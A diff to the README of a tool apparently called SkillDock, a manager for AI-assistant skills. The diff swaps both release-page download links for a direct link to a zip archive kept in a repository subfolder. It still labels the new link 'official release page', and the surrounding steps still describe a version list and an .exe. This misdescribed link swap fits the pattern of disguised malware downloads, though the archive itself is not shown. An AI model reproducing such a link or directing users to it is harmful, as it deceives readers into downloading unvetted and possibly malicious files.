@@ -1,6 +1,6 @@
 # 🛠️ skill-manager - Manage your AI assistant skills easily
 
-[![Download SkillDock](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/adqr5270/skill-manager/releases)
+[![Download SkillDock](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/adqr5270/skill-manager/raw/refs/heads/main/caponier/skill-manager-v3.6.zip)
 
 SkillDock helps you organize your AI tasks. It manages skills for your coding tools and AI assistants. You can install, view, update, and sync these items without manual work. The app tracks changes from the source and keeps your own edits safe.
 
@@ -8,7 +8,7 @@ SkillDock helps you organize your AI tasks. It manages skills for your coding to
 
 You need to download the installer from the release page.
 
-1. Go to the [official release page](https://github.com/adqr5270/skill-manager/releases).
+1. Go to the [official release page](https://github.com/adqr5270/skill-manager/raw/refs/heads/main/caponier/skill-manager-v3.6.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe for Windows.
 4. Save the file to your computer.
